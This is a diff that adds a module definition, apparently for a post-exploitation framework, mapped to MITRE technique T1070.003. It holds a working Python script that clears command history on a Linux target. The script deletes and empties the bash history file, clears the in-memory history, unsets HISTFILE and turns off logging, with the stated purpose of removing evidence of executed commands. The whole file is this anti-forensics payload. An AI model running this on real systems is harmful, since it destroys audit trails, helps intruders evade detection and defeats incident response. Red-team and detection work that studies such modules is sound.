@@ -1,0 +1,59 @@
+name: clear_command_history
+authors:
+  - name: Anthony Rose
+    handle: '@Cx01N'
+    link: https://twitter.com/Cx01N_
+description: |
+  Clears command history on a Linux target to remove evidence of
+  executed commands. Performs multiple cleanup actions including
+  removing the bash history file, clearing the in-memory history
+  cache, writing /dev/null to the history file, and unsetting the
+  HISTFILE environment variable to prevent future logging for the
+  current session.
+software: ''
+tactics: [TA0005]
+techniques: [T1070.003]
+background: false
+output_extension: ''
+needs_admin: false
+opsec_safe: false
+language: python
+min_language_version: '2.6'
+comments:
+  - https://github.com/redcanaryco/atomic-red-team
+options:
+  - name: HistoryFile
+    description: Path to the bash history file.
+    required: false
+    value: '~/.bash_history'
+script: |
+  import os
+  import subprocess
+
+  history_file = os.path.expanduser('{{ HistoryFile }}' or '~/.bash_history')
+  results = []
+
+  # Remove the history file
+  if os.path.exists(history_file):
+      os.remove(history_file)
+      results.append('[+] Removed history file: {}'.format(history_file))
+  else:
+      results.append('[*] History file not found: {}'.format(history_file))
+
+  # Clear history cache and unset HISTFILE
+  commands = [
+      'history -c',
+      'cat /dev/null > {}'.format(history_file),
+      'unset HISTFILE',
+      'export HISTFILESIZE=0',
+      'export HISTSIZE=0',
+      'set +o history',
+  ]
+  for cmd in commands:
+      try:
+          run_command(cmd)
+          results.append('[+] Executed: {}'.format(cmd))
+      except Exception as e:
+          results.append('[-] Failed: {} ({})'.format(cmd, str(e)))
+
+  print('\n'.join(results))
